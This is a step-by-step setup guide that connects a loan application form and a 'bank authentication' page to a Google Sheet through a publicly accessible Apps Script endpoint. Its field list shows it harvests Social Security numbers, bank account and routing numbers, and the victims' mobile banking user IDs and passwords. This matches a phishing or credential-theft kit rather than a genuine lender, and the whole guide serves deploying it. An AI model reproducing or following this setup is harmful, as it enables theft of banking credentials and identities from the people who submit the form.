# Google Sheets Integration Setup Guide

## Step 1: Create Google Sheet
1. Go to [Google Sheets](https://sheets.google.com)
2. Create a new spreadsheet named "Loan Applications"
3. The script will automatically create headers on first submission

## Step 2: Create Google Apps Script
1. Go to [Google Apps Script](https://script.google.com/home)
2. Click "New Project"
3. Copy the code from `google-sheets-api.js` and paste it
4. Replace `YOUR_SPREADSHEET_ID` with your actual Sheet ID:
   - Open your Google Sheet
   - Look at the URL: `https://docs.google.com/spreadsheets/d/SPREADSHEET_ID/edit`
   - Copy the SPREADSHEET_ID part

## Step 3: Deploy as Web App
1. In Apps Script editor, click "Deploy" > "New Deployment"
2. Select "Web app" as type
3. Configuration:
   - Description: "Loan Application API"
   - Execute as: "Me" (your Google account)
   - Who has access: "Anyone" (for form submissions)
4. Click "Deploy"
5. Authorize the permissions when prompted
6. Copy the Web app URL (it looks like: `https://script.google.com/macros/s/DEPLOYMENT_ID/exec`)

## Step 4: Update Website Code
1. In `bank-auth.html`, find this line:
   ```javascript
   const GOOGLE_SHEETS_URL = 'https://script.google.com/macros/s/YOUR_DEPLOYMENT_ID/exec';
   ```
2. Replace `YOUR_DEPLOYMENT_ID` with your actual deployment ID from step 3

## Step 5: Test the Integration
1. Fill out the personal loan form
2. Fill out the bank authentication form
3. Check your Google Sheet - data should appear in a single row
4. Check browser console for any errors

## Field Mapping
The data will be stored in this column order:
- Timestamp
- Loan Amount
- Loan Purpose
- Credit Score
- Name
- Email
- Phone
- Street Address
- City
- State
- Zip Code
- SSN
- Bank Name
- Routing Number
- Account Number
- Annual Income
- Employment Status
- Monthly Housing
- Your Bank (from bank auth)
- Mobile Banking User ID
- Mobile Banking Password
- Application Type

## Security Notes
- The Web app URL should be kept private
- Regularly review your Google Sheet for submissions
- Consider enabling notifications for new form submissions
- The password field is stored as-is - consider encryption for production

## Troubleshooting
- If no data appears: Check the Google Apps Script logs
- If CORS errors: This is normal with `no-cors` mode, data may still be saved
- If permissions error: Re-deploy the Web app with correct permissions
- Check browser console for detailed error messages
